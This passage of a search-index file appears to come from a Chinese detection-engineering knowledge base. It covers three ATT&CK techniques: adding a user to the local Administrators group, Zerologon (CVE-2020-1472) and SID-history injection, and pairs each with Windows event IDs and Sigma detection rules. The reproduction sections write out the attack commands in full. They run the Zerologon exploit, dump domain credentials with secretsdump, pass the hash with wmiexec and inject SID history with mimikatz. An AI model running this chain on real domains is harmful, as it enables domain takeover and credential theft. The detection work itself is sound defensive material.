\u5b89\u5168\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7%E5%88%B0%E6%9C%AC%E5%9C%B0%E7%BB%84/#_3","text":"C:\\Windows\\system32>net localgroup administrators admin09 /add \u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7%E5%88%B0%E6%9C%AC%E5%9C%B0%E7%BB%84/#_4","text":"\u5df2\u5411\u542f\u7528\u4e86\u5b89\u5168\u6027\u7684\u672c\u5730\u7ec4\u4e2d\u6dfb\u52a0\u67d0\u4e2a\u6210\u5458\u3002 \u4e3b\u9898: \u5b89\u5168 ID: 12306Br0-PC\\12306Br0 \u5e10\u6237\u540d: 12306Br0 \u5e10\u6237\u57df: 12306Br0-PC \u767b\u5f55 ID: 0x51893 \u6210\u5458: \u5b89\u5168 ID: 12306Br0-PC\\admin09 \u5e10\u6237\u540d: - \u7ec4: \u5b89\u5168 ID: BUILTIN\\Administrators \u7ec4\u540d: Administrators \u7ec4\u57df: Builtin \u9644\u52a0\u4fe1\u606f: \u7279\u6743: -","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7%E5%88%B0%E6%9C%AC%E5%9C%B0%E7%BB%84/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7%E5%88%B0%E6%9C%AC%E5%9C%B0%E7%BB%84/#sigma","text":"title: \u6dfb\u52a0\u7528\u6237\u5230\u672c\u5730\u7ec4 description: \u6b64\u89c4\u5219\u89e6\u53d1\u6dfb\u52a0\u5230\u672c\u5730Administrators\u7ec4\u7684\u7528\u6237\u5e10\u6237\uff0c\u8fd9\u53ef\u80fd\u662f\u5408\u6cd5\u6d3b\u52a8\u6216\u7279\u6743\u5347\u7ea7\u6d3b\u52a8\u7684\u6807\u5fd7\u3002 status: stable author: 12306Br0(\u6d4b\u8bd5+\u7ffb\u8bd1) date: 2020/06/08 tags: - attack.privilege_escalation - attack.t1078 logsource: product: windows service: security detection: selection: EventID: - \u201c4732\u201d #\u4e00\u540d\u7528\u6237\u88ab\u6dfb\u52a0\u5230\u5b89\u5168\u672c\u5730\u7ec4 - \u201d4720\u201c # \u5df2\u521b\u5efa\u7528\u6237\u5e10\u6237 selection_group1: GroupName: 'Administrators' #\u7ec4\u540d filter: SubjectUserName: '*$' condition: selection and (1 of selection_group*) and not filter falsepositives: - \u5408\u6cd5\u7528\u6237\u6d3b\u52a8 level: medium","title":"sigma\u89c4\u5219"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7%E5%88%B0%E6%9C%AC%E5%9C%B0%E7%BB%84/#_6","text":"\u68c0\u6d4b\u65b9\u6cd5\u9664\u4e864732\u4e4b\u5916\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc74720\u6765\u8fdb\u884c\u68c0\u6d4b\u3002","title":"\u5efa\u8bae"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7%E5%88%B0%E6%9C%AC%E5%9C%B0%E7%BB%84/#_7","text":"MITRE-ATT&CK-T1078-003 https://attack.mitre.org/techniques/T1078/003","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1134-001-win-CVE-2020-1472/","text":"T1134-001-win-CVE-2020-1472 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u590d\u5236\uff0c\u7136\u540e\u5192\u5145\u53e6\u4e00\u4e2a\u7528\u6237\u7684\u4ee4\u724c\u4ee5\u63d0\u5347\u7279\u6743\u5e76\u7ed5\u8fc7\u8bbf\u95ee\u63a7\u5236\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u8bbf\u95ee\u4ee4\u724c\uff0c\u8be5\u4ee4\u724c\u4f7f\u7528\u6765\u590d\u5236\u73b0\u6709\u4ee4\u724cDuplicateToken(Ex)\u3002\u7136\u540e\u53ef\u4ee5\u5c06\u8be5\u4ee4\u724c\u7528\u4e8eImpersonateLoggedOnUser\u5141\u8bb8\u8c03\u7528\u7ebf\u7a0b\u6a21\u62df\u5df2\u767b\u5f55\u7528\u6237\u7684\u5b89\u5168\u4e0a\u4e0b\u6587\uff0c\u6216\u8005SetThreadToken\u7528\u4e8e\u5c06\u6a21\u62df\u4ee4\u724c\u5206\u914d\u7ed9\u7ebf\u7a0b\u3002 \u5f53\u653b\u51fb\u8005\u5177\u6709\u8981\u5c06\u65b0\u4ee4\u724c\u5206\u914d\u7ed9\u7684\u7279\u5b9a\u73b0\u6709\u8fc7\u7a0b\u65f6\uff0c\u4ed6\u4eec\u53ef\u4ee5\u6267\u884c\u6b64\u64cd\u4f5c\u3002\u4f8b\u5982\uff0c\u5f53\u76ee\u6807\u7528\u6237\u5728\u7cfb\u7edf\u4e0a\u5177\u6709\u975e\u7f51\u7edc\u767b\u5f55\u4f1a\u8bdd\u65f6\uff0c\u8fd9\u53ef\u80fd\u5f88\u6709\u7528\u3002 \u6d4b\u8bd5\u6848\u4f8b 2020\u5e749\u670811\u65e5\uff0c\u5b89\u5168\u7814\u7a76\u5458Secura\u53d1\u5e03\u4e86\u516c\u544a\uff0c\u9610\u660e\u4e86Microsoft\u57282020\u5e748\u6708\u4fee\u8865\u7684\u6f0f\u6d1e\u7ec6\u8282\uff08CVE-2020-1472\uff09\u3002\u8be5\u6f0f\u6d1e\u4e5f\u79f0\u4e3a\u201cZerologon\u201d\uff0cCVSS\u8bc4\u5206\u4e3a10.0\uff0c\u53f7\u79f03\u79d2\u64b8\u57df\u63a7\uff0c\u5371\u5bb3\u4e25\u91cd\u3002\u653b\u51fb\u8005\u5728\u901a\u8fc7NetLogon\uff08MS-NRPC\uff09\u534f\u8bae\u4e0eAD\u57df\u63a7\u5efa\u7acb\u5b89\u5168\u901a\u9053\u65f6\uff0c\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u5c06AD\u57df\u63a7\u7684\u8ba1\u7b97\u673a\u8d26\u53f7\u5bc6\u7801\u7f6e\u4e3a\u7a7a\uff0c\u4ece\u800c\u63a7\u5236\u57df\u63a7\u670d\u52a1\u5668\u3002\u672c\u6587\u5c06\u4ece\u201cZerologon\u201d\u6f0f\u6d1e\u539f\u7406\u3001\u6f0f\u6d1e\u590d\u73b0\u3001\u5a01\u80c1\u72e9\u730e\u4e09\u4e2a\u7ef4\u5ea6\u5bf9\u8be5\u6f0f\u6d1e\u8fdb\u884c\u5206\u6790\u3002 \u5177\u4f53\u53ef\u53c2\u8003\u5b89\u5168\u5ba2\u76f8\u5173\u6587\u7ae0\uff0c \u4f20\u9001\u95e8 \u68c0\u6d4b\u65e5\u5fd7 Windows \u7cfb\u7edf\u65e5\u5fd7\u3001\u5168\u6d41\u91cf \u6b64\u5916\uff0c\u57288\u6708\u4efd\u7684\u8865\u4e01\u4e2d\uff0cMicrosoft\u6dfb\u52a0\u4e86\u4e94\u4e2a\u65b0\u7684event ID\uff0c\u4ee5\u901a\u77e5\u6613\u53d7\u653b\u51fb\u7684Netlogon\u8fde\u63a5\uff1a 1\u3001\u5141\u8bb8\u5b58\u5728\u6f0f\u6d1e\u7684Netlogon\u5b89\u5168\u901a\u9053\u8fde\u63a5\u65f6\uff0c\u5c06\u751f\u6210event ID 5829 2\u3001\u62d2\u7edd\u6613\u53d7\u653b\u51fb\u7684Netlogon\u8fde\u63a5\u65f6\uff0c\u5c06\u89e6\u53d1event ID 5827\u548c5828 3\u3001\u5141\u8bb8\u5b58\u5728\u6f0f\u6d1e\u7684Netlogon\u8fde\u63a5\u65f6\u89e6\u53d1\u7684event ID 5830\u548c5831 \u5982\u679c\u57df\u63a7\u5df2\u7ecf\u5b89\u88c5\u4e86\u8865\u4e01\uff0c\u8fd8\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0a5\u4e2aevent ID\u8fdb\u884c\u5a01\u80c1\u72e9\u730e\u3002 \u6d4b\u8bd5\u590d\u73b0 \u4ee5\u4e0b\u6a21\u62df\u6d4b\u8bd5\u8fc7\u7a0b\u6765\u81ea\u5b89\u5168\u5ba2\u76f8\u5173\u6587\u7ae0\uff0c \u4f20\u9001\u95e8 \u5b9e\u9a8c\u73af\u5883\uff1a \u57df\u63a7\uff1aWinserver2012 R2\uff08x64\uff09 IP\uff1a10.10.10.10 hostname\uff1aDC \u57df\uff1ade1ay.com \u653b\u51fb\u673a\uff1aubuntu1604\uff08x64\uff09 IP\uff1a10.10.10.111 \u8fd0\u884cexp\u811a\u672c\uff0c\u6210\u529f\u5c06AD\u57df\u63a7\u7684\u673a\u5668\u8d26\u6237DC\u7684\u5bc6\u7801\u7f6e\u6362\u6210\u7a7a\uff1a python3 cve-2020-1472-exploit.py DC 10.10.10.10 \u6b64\u65f6\u57df\u63a7\u670d\u52a1\u5668\u8d26\u6237\u5bc6\u7801\u4e3a\u7a7a\uff0c\u540c\u7b49\u4e8e\u5df2\u77e5\u5bc6\u7801\uff0c\u53ef\u4ee5\u5bfc\u51fa\u57df\u5185\u6240\u6709\u7528\u6237\u51ed\u636e\uff1a python3 secretsdump.py de1ay/DC\\$@10.10.10.10 -no-pass \u5bfc\u51fahash\u540e\uff0c\u53d1\u73b0DC\u7684hash\u4e3a31d6cfe0d16ae931b73c59d7e0c089c0\uff0c\u4e5f\u5c31\u662f\u7a7a\u5bc6\u7801\uff0c\u540c\u65f6\u83b7\u5f97\u4e86\u57df\u7ba1administrator\u7684hash\uff0c\u5229\u7528administrator\u7684hash\u62ff\u4e0b\u57df\u63a7\uff1a python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24 Administrator@10.10.10.10 \u6d4b\u8bd5\u7559\u75d5 \u6682\u65e0\uff0c\u5177\u4f53\u540c\u6837\u53ef\u53c2\u8003\u5b89\u5168\u5ba2\u6587\u7ae0\uff0c \u4f20\u9001\u95e8 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 \u68c0\u6d4b\u89c4\u52191 title: Possible CVE-2020-1472 (zerologon) description: CVE-2020-1472 (Netlogon Elevation of Privilege Vulnerability) may create thousands of NetrServerReqChallenge & NetrServerAuthenticate3 requests in a short amount of time. author: SOC Prime Team date: 2020/09/11 references: - https://github.com/SecuraBV/CVE-2020-1472 tags: - attack.lateral_movement - attack.T1210 logsource: product: zeek service: dce_rpc detection: selection: endpoint: 'netlogon' operation: 'NetrServerReqChallenge' selection2: endpoint: 'netlogon' operation: 'NetrServerAuthenticate3' timeframe: 1m condition: selection or selection2 | count() by src_ip > 100 falsepositives: - 'unknown' level: high \u68c0\u6d4b\u89c4\u52192 title: Vulnerable Netlogon Secure Channel Connection Allowed id: a0cb7110-edf0-47a4-9177-541a4083128a status: experimental description: Detects that a vulnerable Netlogon secure channel connection was allowed, which could be an indicator of CVE-2020-1472. references: - https://support.microsoft.com/en-us/help/4557222/how-to-manage-the-changes-in-netlogon-secure-channel-connections-assoc author: NVISO date: 2020/09/15 tags: - attack.privilege_escalation logsource: product: windows service: system detection: selection: EventID: - 5829 #\u5177\u5907\u4e00\u5b9a\u7684\u5c40\u9650\u6027\uff0c\u9700\u8981\u57df\u63a7\u4e3b\u673a\u6253\u5b8c\u8865\u4e01\u540e\uff0c\u65b9\u53ef\u4f7f\u7528 condition: selection fields: - SAMAccountName falsepositives: - Unknown level: high \u5efa\u8bae \u76f8\u5173\u89c4\u5219\u672a\u5728\u771f\u5b9e\u73af\u5883\u4e2d\u8fdb\u884c\u6d4b\u8bd5\uff0c\u6548\u679c\u672a\u77e5\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1134-001 https://attack.mitre.org/techniques/T1134/001/ ZeroLogon\uff08CVE-2020-1472\uff09\u5206\u6790\u4e0e\u72e9\u730e https://www.anquanke.com/post/id/219090#h2-2 win_vul_cve_2020_1472-sigma https://github.com/Neo23x0/sigma/blob/2cd9b794e677a038f3ace5b15d649ca191809846/rules/windows/builtin/win_vul_cve_2020_1472.yml zeek\u5b98\u65b9 https://zeek.org/","title":"T1134-001-win-CVE-2020-1472"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1134-001-win-CVE-2020-1472/#t1134-001-win-cve-2020-1472","text":"","title":"T1134-001-win-CVE-2020-1472"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1134-001-win-CVE-2020-1472/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u590d\u5236\uff0c\u7136\u540e\u5192\u5145\u53e6\u4e00\u4e2a\u7528\u6237\u7684\u4ee4\u724c\u4ee5\u63d0\u5347\u7279\u6743\u5e76\u7ed5\u8fc7\u8bbf\u95ee\u63a7\u5236\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u8bbf\u95ee\u4ee4\u724c\uff0c\u8be5\u4ee4\u724c\u4f7f\u7528\u6765\u590d\u5236\u73b0\u6709\u4ee4\u724cDuplicateToken(Ex)\u3002\u7136\u540e\u53ef\u4ee5\u5c06\u8be5\u4ee4\u724c\u7528\u4e8eImpersonateLoggedOnUser\u5141\u8bb8\u8c03\u7528\u7ebf\u7a0b\u6a21\u62df\u5df2\u767b\u5f55\u7528\u6237\u7684\u5b89\u5168\u4e0a\u4e0b\u6587\uff0c\u6216\u8005SetThreadToken\u7528\u4e8e\u5c06\u6a21\u62df\u4ee4\u724c\u5206\u914d\u7ed9\u7ebf\u7a0b\u3002 \u5f53\u653b\u51fb\u8005\u5177\u6709\u8981\u5c06\u65b0\u4ee4\u724c\u5206\u914d\u7ed9\u7684\u7279\u5b9a\u73b0\u6709\u8fc7\u7a0b\u65f6\uff0c\u4ed6\u4eec\u53ef\u4ee5\u6267\u884c\u6b64\u64cd\u4f5c\u3002\u4f8b\u5982\uff0c\u5f53\u76ee\u6807\u7528\u6237\u5728\u7cfb\u7edf\u4e0a\u5177\u6709\u975e\u7f51\u7edc\u767b\u5f55\u4f1a\u8bdd\u65f6\uff0c\u8fd9\u53ef\u80fd\u5f88\u6709\u7528\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1134-001-win-CVE-2020-1472/#_1","text":"2020\u5e749\u670811\u65e5\uff0c\u5b89\u5168\u7814\u7a76\u5458Secura\u53d1\u5e03\u4e86\u516c\u544a\uff0c\u9610\u660e\u4e86Microsoft\u57282020\u5e748\u6708\u4fee\u8865\u7684\u6f0f\u6d1e\u7ec6\u8282\uff08CVE-2020-1472\uff09\u3002\u8be5\u6f0f\u6d1e\u4e5f\u79f0\u4e3a\u201cZerologon\u201d\uff0cCVSS\u8bc4\u5206\u4e3a10.0\uff0c\u53f7\u79f03\u79d2\u64b8\u57df\u63a7\uff0c\u5371\u5bb3\u4e25\u91cd\u3002\u653b\u51fb\u8005\u5728\u901a\u8fc7NetLogon\uff08MS-NRPC\uff09\u534f\u8bae\u4e0eAD\u57df\u63a7\u5efa\u7acb\u5b89\u5168\u901a\u9053\u65f6\uff0c\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u5c06AD\u57df\u63a7\u7684\u8ba1\u7b97\u673a\u8d26\u53f7\u5bc6\u7801\u7f6e\u4e3a\u7a7a\uff0c\u4ece\u800c\u63a7\u5236\u57df\u63a7\u670d\u52a1\u5668\u3002\u672c\u6587\u5c06\u4ece\u201cZerologon\u201d\u6f0f\u6d1e\u539f\u7406\u3001\u6f0f\u6d1e\u590d\u73b0\u3001\u5a01\u80c1\u72e9\u730e\u4e09\u4e2a\u7ef4\u5ea6\u5bf9\u8be5\u6f0f\u6d1e\u8fdb\u884c\u5206\u6790\u3002 \u5177\u4f53\u53ef\u53c2\u8003\u5b89\u5168\u5ba2\u76f8\u5173\u6587\u7ae0\uff0c \u4f20\u9001\u95e8","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1134-001-win-CVE-2020-1472/#_2","text":"Windows \u7cfb\u7edf\u65e5\u5fd7\u3001\u5168\u6d41\u91cf \u6b64\u5916\uff0c\u57288\u6708\u4efd\u7684\u8865\u4e01\u4e2d\uff0cMicrosoft\u6dfb\u52a0\u4e86\u4e94\u4e2a\u65b0\u7684event ID\uff0c\u4ee5\u901a\u77e5\u6613\u53d7\u653b\u51fb\u7684Netlogon\u8fde\u63a5\uff1a 1\u3001\u5141\u8bb8\u5b58\u5728\u6f0f\u6d1e\u7684Netlogon\u5b89\u5168\u901a\u9053\u8fde\u63a5\u65f6\uff0c\u5c06\u751f\u6210event ID 5829 2\u3001\u62d2\u7edd\u6613\u53d7\u653b\u51fb\u7684Netlogon\u8fde\u63a5\u65f6\uff0c\u5c06\u89e6\u53d1event ID 5827\u548c5828 3\u3001\u5141\u8bb8\u5b58\u5728\u6f0f\u6d1e\u7684Netlogon\u8fde\u63a5\u65f6\u89e6\u53d1\u7684event ID 5830\u548c5831 \u5982\u679c\u57df\u63a7\u5df2\u7ecf\u5b89\u88c5\u4e86\u8865\u4e01\uff0c\u8fd8\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0a5\u4e2aevent ID\u8fdb\u884c\u5a01\u80c1\u72e9\u730e\u3002","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1134-001-win-CVE-2020-1472/#_3","text":"\u4ee5\u4e0b\u6a21\u62df\u6d4b\u8bd5\u8fc7\u7a0b\u6765\u81ea\u5b89\u5168\u5ba2\u76f8\u5173\u6587\u7ae0\uff0c \u4f20\u9001\u95e8 \u5b9e\u9a8c\u73af\u5883\uff1a \u57df\u63a7\uff1aWinserver2012 R2\uff08x64\uff09 IP\uff1a10.10.10.10 hostname\uff1aDC \u57df\uff1ade1ay.com \u653b\u51fb\u673a\uff1aubuntu1604\uff08x64\uff09 IP\uff1a10.10.10.111 \u8fd0\u884cexp\u811a\u672c\uff0c\u6210\u529f\u5c06AD\u57df\u63a7\u7684\u673a\u5668\u8d26\u6237DC\u7684\u5bc6\u7801\u7f6e\u6362\u6210\u7a7a\uff1a python3 cve-2020-1472-exploit.py DC 10.10.10.10 \u6b64\u65f6\u57df\u63a7\u670d\u52a1\u5668\u8d26\u6237\u5bc6\u7801\u4e3a\u7a7a\uff0c\u540c\u7b49\u4e8e\u5df2\u77e5\u5bc6\u7801\uff0c\u53ef\u4ee5\u5bfc\u51fa\u57df\u5185\u6240\u6709\u7528\u6237\u51ed\u636e\uff1a python3 secretsdump.py de1ay/DC\\$@10.10.10.10 -no-pass \u5bfc\u51fahash\u540e\uff0c\u53d1\u73b0DC\u7684hash\u4e3a31d6cfe0d16ae931b73c59d7e0c089c0\uff0c\u4e5f\u5c31\u662f\u7a7a\u5bc6\u7801\uff0c\u540c\u65f6\u83b7\u5f97\u4e86\u57df\u7ba1administrator\u7684hash\uff0c\u5229\u7528administrator\u7684hash\u62ff\u4e0b\u57df\u63a7\uff1a python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24 Administrator@10.10.10.10","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1134-001-win-CVE-2020-1472/#_4","text":"\u6682\u65e0\uff0c\u5177\u4f53\u540c\u6837\u53ef\u53c2\u8003\u5b89\u5168\u5ba2\u6587\u7ae0\uff0c \u4f20\u9001\u95e8","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1134-001-win-CVE-2020-1472/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1134-001-win-CVE-2020-1472/#sigma","text":"","title":"sigma\u89c4\u5219"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1134-001-win-CVE-2020-1472/#1","text":"title: Possible CVE-2020-1472 (zerologon) description: CVE-2020-1472 (Netlogon Elevation of Privilege Vulnerability) may create thousands of NetrServerReqChallenge & NetrServerAuthenticate3 requests in a short amount of time. author: SOC Prime Team date: 2020/09/11 references: - https://github.com/SecuraBV/CVE-2020-1472 tags: - attack.lateral_movement - attack.T1210 logsource: product: zeek service: dce_rpc detection: selection: endpoint: 'netlogon' operation: 'NetrServerReqChallenge' selection2: endpoint: 'netlogon' operation: 'NetrServerAuthenticate3' timeframe: 1m condition: selection or selection2 | count() by src_ip > 100 falsepositives: - 'unknown' level: high","title":"\u68c0\u6d4b\u89c4\u52191"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1134-001-win-CVE-2020-1472/#2","text":"title: Vulnerable Netlogon Secure Channel Connection Allowed id: a0cb7110-edf0-47a4-9177-541a4083128a status: experimental description: Detects that a vulnerable Netlogon secure channel connection was allowed, which could be an indicator of CVE-2020-1472. references: - https://support.microsoft.com/en-us/help/4557222/how-to-manage-the-changes-in-netlogon-secure-channel-connections-assoc author: NVISO date: 2020/09/15 tags: - attack.privilege_escalation logsource: product: windows service: system detection: selection: EventID: - 5829 #\u5177\u5907\u4e00\u5b9a\u7684\u5c40\u9650\u6027\uff0c\u9700\u8981\u57df\u63a7\u4e3b\u673a\u6253\u5b8c\u8865\u4e01\u540e\uff0c\u65b9\u53ef\u4f7f\u7528 condition: selection fields: - SAMAccountName falsepositives: - Unknown level: high","title":"\u68c0\u6d4b\u89c4\u52192"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1134-001-win-CVE-2020-1472/#_6","text":"\u76f8\u5173\u89c4\u5219\u672a\u5728\u771f\u5b9e\u73af\u5883\u4e2d\u8fdb\u884c\u6d4b\u8bd5\uff0c\u6548\u679c\u672a\u77e5\u3002","title":"\u5efa\u8bae"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1134-001-win-CVE-2020-1472/#_7","text":"MITRE-ATT&CK-T1134-001 https://attack.mitre.org/techniques/T1134/001/ ZeroLogon\uff08CVE-2020-1472\uff09\u5206\u6790\u4e0e\u72e9\u730e https://www.anquanke.com/post/id/219090#h2-2 win_vul_cve_2020_1472-sigma https://github.com/Neo23x0/sigma/blob/2cd9b794e677a038f3ace5b15d649ca191809846/rules/windows/builtin/win_vul_cve_2020_1472.yml zeek\u5b98\u65b9 https://zeek.org/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1134-005-win-SID%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95%E6%B3%A8%E5%85%A5/","text":"T1134-005-win-SID\u5386\u53f2\u8bb0\u5f55\u6ce8\u5165 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 Windows\u5b89\u5168\u6807\u8bc6\u7b26\uff08SID\uff09\u662f\u6807\u8bc6\u7528\u6237\u6216\u7ec4\u5e10\u6237\u7684\u552f\u4e00\u503c\u3002Windows\u5b89\u5168\u5728\u5b89\u5168\u63cf\u8ff0\u7b26\u548c\u8bbf\u95ee\u4ee4\u724c\u4e2d\u90fd\u4f7f\u7528SID\u3002\u5e10\u6237\u53ef\u4ee5\u5728SID\u5386\u53f2Active Directory\u5c5e\u6027\u4fdd\u7559\u5176\u4ed6SID \uff0c\u4ece\u800c\u5141\u8bb8\u57df\u4e4b\u95f4\u53ef\u4e92\u64cd\u4f5c\u7684\u5e10\u6237\u8fc1\u79fb\uff08\u4f8b\u5982\uff0cSID\u5386\u53f2\u4e2d\u7684\u6240\u6709\u503c\u90fd\u5305\u542b\u5728\u8bbf\u95ee\u4ee4\u724c\u4e2d\uff09\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u6b64\u673a\u5236\u8fdb\u884c\u7279\u6743\u5347\u7ea7\u3002\u501f\u52a9\u57df\u7ba1\u7406\u5458\uff08\u6216\u540c\u7b49\u6743\u9650\uff09\u6743\u9650\uff0c\u53ef\u4ee5\u5c06\u6536\u96c6\u7684\u6216\u4f17\u6240\u5468\u77e5\u7684SID\u503c\u63d2\u5165SID\u5386\u53f2\u8bb0\u5f55\u4e2d\uff0c\u4ee5\u6a21\u62df\u4efb\u610f\u7528\u6237/\u7ec4\uff0c\u4f8b\u5982\u4f01\u4e1a\u7ba1\u7406\u5458\u3002\u901a\u8fc7\u6a2a\u5411\u79fb\u52a8\u6280\u672f\uff08\u4f8b\u5982\uff0c \u8fdc\u7a0b\u670d\u52a1 \uff0c Windows Admin\u5171\u4eab \u6216 Windows\u8fdc\u7a0b\u7ba1\u7406\uff09 \uff0c\u6b64\u64cd\u4f5c\u53ef\u80fd\u5bfc\u81f4\u5bf9\u672c\u5730\u8d44\u6e90\u7684\u8bbf\u95ee\u6216\u5bf9\u539f\u672c\u65e0\u6cd5\u8bbf\u95ee\u7684\u57df\u7684\u8bbf\u95ee\u3002 \u6d4b\u8bd5\u6848\u4f8b \u6d4b\u8bd5\u5de5\u5177\u53ef\u4ee5\u662fEmpire\uff0c\u4e5f\u53ef\u4ee5\u662fmimikatz\u3002 \u5982\u679c\u5728\u57df\u63a7\u5236\u5668\u4e0a\uff0c Empire \u53ef\u4ee5\u5411\u7528\u6237\u6dfb\u52a0SID\u5386\u53f2\u8bb0\u5f55\u3002 Mimikatz \u7684 MISC::AddSid \u6a21\u5757\u53ef\u4ee5\u5c06\u4efb\u4f55SID\u6216\u7528\u6237/\u7ec4\u5e10\u6237\u9644\u52a0\u5230\u7528\u6237\u7684SID\u5386\u53f2\u8bb0\u5f55\u4e2d\u3002 Mimikatz \u8fd8\u5229\u7528 SID\u5386\u53f2\u8bb0\u5f55\u6ce8\u5165 \u6765\u6269\u5c55\u5176\u4ed6\u7ec4\u4ef6\u7684\u8303\u56f4\uff0c\u4f8b\u5982\u751f\u6210\u7684Kerberos Golden Ticket\u548cDCSync\u8d85\u51fa\u5355\u4e2a\u57df\u3002 Mimikatz\u652f\u6301SID\u5386\u53f2\u6ce8\u5165\u5230\u4efb\u4f55\u7528\u6237\u5e10\u6237\uff08\u9700\u8981\u57df\u7ba1\u7406\u5458\u6216\u7b49\u6548\u7684\u6743\u9650\uff09\u3002 \u6ce8\u610f\uff1a ADDSID\u5df2\u79fb\u81f32.1\u7248\u672c\u5206\u652f\u4e2d\u7684SID\u6a21\u5757\u3002 mimikatz \"privilege::debug\" \"sid::patch\" \"sid::add /new:administrator /sam:abcc\" \"exit\" mimikatz \"privilege::debug\" \"sid::patch\" \"sid::clear /sam:abcc\" \"exit\" \u6e05\u9664SID\u5386\u53f2\u8bb0\u5f55\u6ce8\u5165 \u68c0\u6d4b\u65e5\u5fd7 windows\u5b89\u5168\u65e5\u5fd7\uff0c4766\u30014765 \u6d4b\u8bd5\u590d\u73b0 \u6682\u65e0\u5177\u4f53\u5b9e\u4f8b\uff0c\u53ef\u53c2\u8003\u4e0a\u8ff0\u5b9e\u4f8b\u547d\u4ee4\uff1a mimikatz \"privilege::debug\" \"sid::patch\" \"sid::add /new:administrator /sam:abcc\" \"exit\" \u6d4b\u8bd5\u7559\u75d5 \u6682\u65e0\uff08 \u6ce8\u610f\u4e8b\u9879 \uff1a4766\u30014765\u4ec5\u9650\u57df\u63a7\u4e3b\u673a\u662fWindows server 2016\u53cawin10\u4ee5\u4e0a\u4f1a\u4ea7\u751f\u6b64\u4e8b\u4ef6\uff09 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: Windows SID\u5386\u53f2\u8bb0\u5f55\u521b\u5efa\u57df\u63a7\u6743\u9650\u540e\u95e8 description: \u57df\u73af\u5883\u6d4b\u8bd5 references: https://adsecurity.org/?p=1772 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection: EventID: - 4766 #\u5c1d\u8bd5\u5c06SID\u5386\u53f2\u8bb0\u5f55\u6dfb\u52a0\u5230\u5e10\u6237\u5931\u8d25\u3002 - 4765 #\u5df2\u5c06 SID \u5386\u53f2\u8bb0\u5f55\u6dfb\u52a0\u5230\u5e10\u6237\u3002 condition: selection level: medium \u6ce8\u610f\u6b64\u68c0\u6d4b\u89c4\u5219\u7684\u9002\u7528\u8303\u56f4\uff1aWindows10\u3001Windows Server 2016\uff0c\u6b64\u4e8b\u4ef6\u5728\u5c06SID\u5386\u53f2\u8bb0\u5f55\u6dfb\u52a0\u5230\u5e10\u6237\u65f6\u751f\u6210\u3002 \u5efa\u8bae \u68c0\u6d4b\u7279\u5f81\u672a\u7ecf\u5b9e\u9645\u6d4b\u8bd5\uff0c\u8c28\u614e\u4f7f\u7528 